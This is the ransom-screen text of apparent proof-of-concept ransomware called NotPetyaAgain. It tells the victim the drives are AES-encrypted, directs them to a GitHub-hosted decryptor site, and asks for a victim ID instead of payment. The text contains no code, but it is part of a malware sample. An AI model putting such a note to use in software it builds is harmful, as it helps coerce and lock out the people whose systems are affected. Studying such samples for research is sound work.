You became a victim of the NOTPETYAAGAIN RANSOMWARE!
--------------------------------------------------------------------
The drives of your computer have been encrypted with an advanced
military grade encryption algorithm known as AES.
However, the key used for the encryption and decryption has now been 
discarded and lost except for the victim ID used to generate the key.

Luckily for you, to decrypt your system, follow these 4 simple steps:

1) Swear on god that you will NOT run any more malware!
2) Go to not-petya-again-decryptor.github.io or the NotPetyaUEFI repo 
on GitHub.
3) Enter your PVID (provided below) via the website or script and the
decryption key will be generated and provided.
4) Enter the decryption key below and NotPetyaAgain will decrypt your
system.

IMPORTANT: Once decryption begins, DO NOT RESTART OR POWER OFF YOUR PC
UNTIL THE DECRYPTION ROUTINE IS COMPLETE!

Your Personal Victim ID (PVID):
